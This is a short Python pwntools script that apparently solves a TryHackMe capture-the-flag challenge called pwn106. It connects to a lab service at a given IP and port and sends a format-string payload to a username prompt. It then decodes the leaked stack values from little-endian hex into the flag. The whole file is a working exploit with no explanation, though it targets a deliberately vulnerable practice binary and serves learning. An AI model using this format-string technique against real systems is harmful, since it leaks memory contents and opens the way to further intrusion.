from pwn import *

DEBUG = 1

if DEBUG == 0:
    p = process("./pwn106")
else:
    p = remote("10.10.163.188", 9006)
    
p.recvuntil(b"Enter your THM username to participate in the giveaway:")

p.sendline(b"%6$p %7$p %8$p %9$p %10$p %11$p ")


p.recvuntil(b"Thanks")
leak = p.recvline().strip().decode()

leaked_addresses = leak.split()

flag = ""
for addr in leaked_addresses : 
    hex_str = addr[2:]
    leaked_bytes = bytes.fromhex(hex_str)[::-1]
    flag += leaked_bytes.decode('ascii', errors='ignore')
    
print(f"FLAG : {flag}")
